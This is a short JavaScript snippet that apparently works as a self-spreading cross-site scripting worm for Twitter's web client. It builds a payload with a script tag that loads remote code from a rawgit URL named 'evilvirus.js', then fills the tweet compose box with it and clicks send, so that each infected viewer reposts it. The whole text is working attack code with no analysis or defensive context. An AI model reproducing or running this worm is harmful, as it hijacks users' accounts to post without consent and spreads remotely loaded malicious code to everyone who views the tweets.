var virus = "<script>s=document.createElement(\"script\");s.src=\"rawgit.com/iirelu/random/master/evilvirus.js\";document.head.appendChild(s) ♥"
$(".js-compose-text").attr("value", virus);
$(".js-send-tweet-button").removeClass("is-disabled").click();
